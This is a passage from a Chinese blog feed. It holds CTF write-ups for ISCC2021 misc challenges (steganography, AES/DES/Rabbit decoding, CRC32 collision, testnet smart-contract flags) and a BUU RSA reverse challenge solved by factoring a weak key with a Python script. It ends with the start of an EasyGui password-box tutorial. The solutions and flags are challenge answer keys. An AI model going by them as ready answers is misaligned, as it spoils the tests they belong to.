data-original="https://img-blog.csdnimg.cn/20210526202850439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>得出flag</p><h2 id="0x03-美人计"><a href="#0x03-美人计" class="headerlink" title="0x03 美人计"></a>0x03 美人计</h2><p><strong>题目描述：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">美人说的话里有解题提示，但是美人的话不能全信。</span><br></pre></td></tr></table></figure><p>打开压缩包 得到一张图片和一个docx 文件<br>在图片的属性中可以查到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Try AES, <span class="keyword">and</span> you will get the flag. ISCC2021</span><br></pre></td></tr></table></figure><p>得到信息AES加密 密钥是ISCC2021</p><p>扫描docx里面的二维码  得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/6IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu 3GuGWmPOtO27z8vNppD2D50fwsD+8VWhdtW9J4cewYivH/Z/7GoUvcJXJMrvf+vu +CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE +pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=</span><br></pre></td></tr></table></figure><p>进行AES加密三次后得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!</span><br></pre></td></tr></table></figure><p>把docx文件修改后缀为zip后 得到第二个二维码<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210526203802119.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>扫码后进行DES解密 得到flag</p><h2 id="0x04-检查一下"><a href="#0x04-检查一下" class="headerlink" title="0x04 检查一下"></a>0x04 检查一下</h2><p><strong>题目描述：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你真的了解png文件的格式吗？</span><br></pre></td></tr></table></figure><p>直接binwalk分离得到</p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210526204936334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="numberspan></span><br></pre></td></tr></table></figure><p>一共841位，猜测是29*29的二维码，直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">29</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX, MAX))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quotquot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">841</span>,<span class="number">841</span>,<span class="number">841</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>扫码得到flag</p><h2 id="0x05-我的折扣是多少"><a href="#0x05-我的折扣是多少" class="headerlink" title="0x05 我的折扣是多少"></a>0x05 我的折扣是多少</h2><p><strong>题目描述：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小c同学去参加音乐会，在官网买票时发现了有提示消息，提供给的有“give_me_discount”的压缩包，好奇的小c下载下来，但却无从下手，为了节省零花钱，你能帮帮他吗？</span><br></pre></td></tr></table></figure><p>运行give.exe可以得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass1&#123;\u006b\u0072\u0077&#125;</span><br></pre></td></tr></table></figure><p>把中间的进行unicode转码得到：<code>pass1&#123;krw&#125;</code></p><p>把me.zip文件拖到010 editor中<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210526205444908.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>把这里的base编码进行转换得到：<code>pass2&#123;gcc666&#125;</code></p><p>那么压缩包的密码就是krwgcc666   打开压缩包得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eW91Zm91bmRtZT8=</span><br></pre></td></tr></table></figure><p>base64解码得到<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210530192014683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>最后使用MP3Stego</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode -X -P youfoundme? discount.mp3</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210530192052852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>再进行一次base32解码 即可</p><h2 id="0x06海市蜃楼-2"><a href="#0x06海市蜃楼-2" class="headerlink" title="0x06海市蜃楼-2"></a>0x06海市蜃楼-2</h2><p><strong>题目描述：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">嗯！你看到的就是海市蜃楼…</span><br></pre></td></tr></table></figure><p> foremost分离图片，能够得到一个加密的压缩包<br> 得到学长的提示 这是一个组合题 在海市蜃楼-1中的 true.xml中可以发现突破<br> <img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210530193903429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>修改为jpg文件<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210530193937828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>根据海市蜃楼-1的flag还有图片得到 压缩包的密码<strong>zhongnanshan</strong><br>扫码得到<strong>ZWFzeQ==</strong><br>base解码得到<strong>easy</strong><br>foremost得到压缩包口令也为<strong>easy</strong><br>解开得到flag</p><h2 id="0x07Hack-the-Victim"><a href="#0x07Hack-the-Victim" class="headerlink" title="0x07Hack the Victim"></a>0x07Hack the Victim</h2><p><strong>题目描述：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IoTeX 作为硅谷开源项目成立于2017年，致力于构建全球领先的以隐私为中心的高性能区块链平台。IoTeX旨在成为智能万物、开发者与人之间协作与价值交换的可信计算和应用平台，致力于将区块链、可信硬件与边缘计算结合起来，实现万物可信互联，用区块链接世界。</span><br><span class="line">Founded as an open-source platform <span class="keyword">in</span> 2017, IoTeX is building the Internet of Trusted Things, an open ecosystem <span class="built_in">where</span> all “things” — humans, machines, businesses, and DApps — can interact with trust and privacy.</span><br><span class="line">题目描述详见附件。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Victim 为含有漏洞的智能合约，在 Rinkeby 测试网络的合约地址为：</span><br><span class="line"><span class="number">0x68D28fE315E6A344029D42915Fbc7af4261AB833</span></span><br><span class="line">接口为：</span><br><span class="line">contract Victim &#123;</span><br><span class="line"> function withdraw() public returns (string memory )&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;ISCC&#123;xxxxx&#125;&quot;</span>;</span><br><span class="line"> &#125; &#125;</span><br><span class="line">请编写攻击合约，实现对 Victim 的攻击，获取 flag。</span><br></pre></td></tr></table></figure><p>合约地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rinkeby.etherscan.io/address/<span class="number">0x68D28fE315E6A344029D42915Fbc7af4261AB833</span></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/202105301944012.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>十六进制转字符即可得到flag<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210530194442772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><h2 id="0x08小明的宠物兔"><a href="#0x08小明的宠物兔" class="headerlink" title="0x08小明的宠物兔"></a>0x08小明的宠物兔</h2><p><strong>题目描述：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小明的宠物兔总是发出一些神秘的声音，小明很想知道兔兔在干什么，你能帮他翻译一下吗？</span><br></pre></td></tr></table></figure><p>将图片进行binwalk分离<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210530194616591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>得到flag.txt的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==</span><br></pre></td></tr></table></figure><p>应该是rabbit加密的密文</p><p>图片上提示 <strong>碰撞</strong>  应该是要用的CRC32碰撞<br>把py脚本修改一下 补全 特殊字符<br>CRC32碰撞 得到加密压缩包key.zip内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/Python/CRC32]</span><br><span class="line">└─$ python3 crc32.py reverse <span class="number">0x3dacac6b</span> </span><br><span class="line"><span class="number">4</span> <span class="built_in">bytes</span>: &#123;<span class="number">0x47</span>, <span class="number">0x18</span>, <span class="number">0x87</span>, <span class="number">0xce</span>&#125;</span><br><span class="line">verification checksum: <span class="number">0x3dacac6b</span> (OK)</span><br><span class="line"><span class="number">5</span> <span class="built_in">bytes</span>: (<span class="number">0_0</span>) (OK)</span><br><span class="line"><span class="number">5</span> <span class="built_in">bytes</span>: DCr4m (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: 1QhloU (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: 3mmr6H (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: 49Gqqk (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: 5Uumn6 (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: 7ips7+ (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: 8Gpbyp (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: 9G1Sbi (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: EHZxWz (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: F93jxv (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: I6mk_a (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: J+wTt) (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: K+6eo0 (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: KGEHkt (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: N/jUuJ (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: O/+dnS (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: O3d8oG (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: TX.K94 (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: Uy1jKa (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: XJju5k (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: YJ+D.r (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: Zvoklv (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: a3H1hL (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: dG(pwf (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: e7U0i/ (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: fgb2/o (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: g6AbXj (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: kHvqPq (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: kT9-Qe (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: lQqOzZ (OK)</span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span>: vwW0Z8 (OK)                     </span><br></pre></td></tr></table></figure><p>5字节  密钥为(0_0)  rabbit解码 即可得到flag</p><h2 id="0x09区块链"><a href="#0x09区块链" class="headerlink" title="0x09区块链"></a>0x09区块链</h2><p><strong>题目描述：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">智能合约</span><br><span class="line">Flag格式：flag&#123;XXX&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.0</span>;                           //指定所需的编译器版本</span><br><span class="line">//SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">contract look_look &#123;</span><br><span class="line">    function sloc111() public pure returns (string memory)&#123;      //public智能合约外部和内部都可使用的方法</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">合约地址: <span class="number">0x0ed72dfd4c63dd97df8fec07e5a6bba466c6adf5</span></span><br></pre></td></tr></table></figure><p>  挂代理 访问<a href="https://rinkeby.etherscan.io/">https://rinkeby.etherscan.io</a><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210530195407881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>输入合约地址  点击Contract<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210530195433960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>选择UTF-8得到flag</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次ISCC2021比赛学到了不少东西  对于CRC32脚本的修改 还有 智能合约  区块链都有了一定的了解 学习了翻墙 也熟悉了kali的用法<br>跟着复现就会有收获</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-REVERSE-rsa</title>
      <link href="/2021/06/09/BUU-REVERSE-rsa/"/>
      <url>/2021/06/09/BUU-REVERSE-rsa/</url>
      
        <content type="html"><![CDATA[<p>﻿## BUU REVERSE  rsa<br><strong>1.</strong><br>打开后发现了这两个文件<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210523203213314.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p>不用多说flag.enc 文件应该是加密后的东西 那么我们就直接先看pub.key里面的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">/AvKr1rzQczdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p><strong>2</strong><br>猜测应该是RSA算法的一个公钥  <a href="http://tool.chacuo.net/cryptrsakeyparse">RSA公私钥分解</a></p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210523204341621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>公钥指数及模数信息:<br>key长度： 256<br>模数：C0332C5C64AE47182F6C1C876D42336910545A58F7EEFE<br>FC0 BCAAF5AF341CCDD<br>指数：65537 (0x10001)<br>获取到:<br><strong>e = 65537<br>n=869344822960481191906660620034948005889056560172030256<br>17216654058378322103517(模数转换为十进制)</strong></p><p><a href="http://www.factordb.com/index.php?query=86934482296048119190666062003494800588905656017203025617216654058378322103517">通过n分析pq</a><br><strong>3</strong><br><strong>通过n解析p,q<br>p = 285960468890451637935629440372639283459<br>q = 304008741604601924494328155975272418463</strong></p><p>还可以利用yafu分析出来pq<a href="https://blog.csdn.net/vhkjhwbs/article/details/101160822?ops_request_misc=&request_id=&biz_id=102&utm_term=yafu%E5%88%86%E6%9E%90pq&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-.pc_search_result_no_baidu_js&spm=1018.2226.3001.4187">yafu分析</a><br><strong>4.</strong><br>得到pq之后 我们就可以利用脚本来解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"></span><br><span class="line">phin = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line"></span><br><span class="line">key = rsa.PrivateKey(n, e, <span class="built_in">int</span>(d), p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\10245\\Desktop\\output\\flag.enc&quot;</span>, <span class="string">&quot;rb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f = f.read()</span><br><span class="line">    print(rsa.decrypt(f, key))</span><br></pre></td></tr></table></figure><p><strong>最后得到flag{decrypt_256}</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是第一次遇见这样的题目 觉得有些特别 并且学到了很多东西<br>更深入地了解了RSA算法<br>也学习了yafu工具的使用  利用rsa模块和gmpy2模块对RSA进行解密<br>以下是值得一看的文章<br><a href="https://blog.csdn.net/dbs1215/article/details/48953589">RSA算法的深入了解</a><br><a href="https://www.cnblogs.com/Mayfly-nymph/p/11576913.html">BUU-RE-RSA</a><br><a href="https://www.cnblogs.com/hhh5460/p/5243410.html">python下RSA 加密/解密，签名/验证</a><br><a href="https://blog.csdn.net/aoque9909/article/details/101112802?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162177411816780261992812%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162177411816780261992812&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-101112802.pc_search_result_no_baidu_js&utm_term=yafu%E5%88%86%E6%9E%90pq&spm=1018.2226.3001.4187">RSA学习档案</a></p><p><a href="https://blog.csdn.net/qq_39153421/article/details/89820144?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162177411816780261992812%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162177411816780261992812&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-89820144.pc_search_result_no_baidu_js&utm_term=yafu%E5%88%86%E6%9E%90pq&spm=1018.2226.3001.4187">RSA攻击方法总结</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习记录7-----EasyGui中一些好玩的地方3</title>
      <link href="/2021/06/02/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%957-----EasyGui%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E5%9C%B0%E6%96%B93/"/>
      <url>/2021/06/02/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%957-----EasyGui%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E5%9C%B0%E6%96%B93/</url>
      
        <content type="html"><![CDATA[<p>﻿# Python学习记录7—–EasyGui中一些好玩的地方3</p><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><h1 id="一、让用户输入密码"><a href="#一、让用户输入密码" class="headerlink" title="一、让用户输入密码"></a>一、让用户输入密码</h1><p>有时候可能需要让用户输入密码等敏感信息，那么界面看上去应该是这样的：*<strong><strong>**</strong></strong>。<br><strong>1 passwordbox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwordbox(msg=‘Enter your password.’, title=’ ‘, default=’’, image=<span class="literal">None</span>, root=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>passwordbox() 跟 enterbox() 样式一样，不同的是用户输入的内容用星号（*）显示出来，该函数返回用户输入的字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> ac</span><br><span class="line">ac.passwordbox(msg=<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br></pre></td></tr></table></figure><p>程序实现如下：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210522203159822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><strong>2 multpasswordbox()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multpasswordbox(msg=‘Fill <span class="keyword">in</span> values <span class="keyword">for</span> the fields.’, title=’ <span class="string">&#x27;, fields=(), values=(), callback=None, run=True)</span></span><br></pre></td></tr></table></figure><p>multpasswordbox() 跟 multenterbox() 使用相同的接口，但当它显示的时候，最后一个输入框显示为密码的形式（*）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> ac</span><br><span class="line">ac.multpasswordbox(msg=<span class="string">&#x27;请输入用户名和密码：&#x27;</span>,title=<span class="string">&#x27;登录 &#x27;</span>, fields=(<span class="string">&quot;用户名：&quot;</span>,<span class="string">&quot;密码：&quot;</span>)</span><br></pre></td></tr></table></figure><p>程序实现如下：<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210522203518472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" 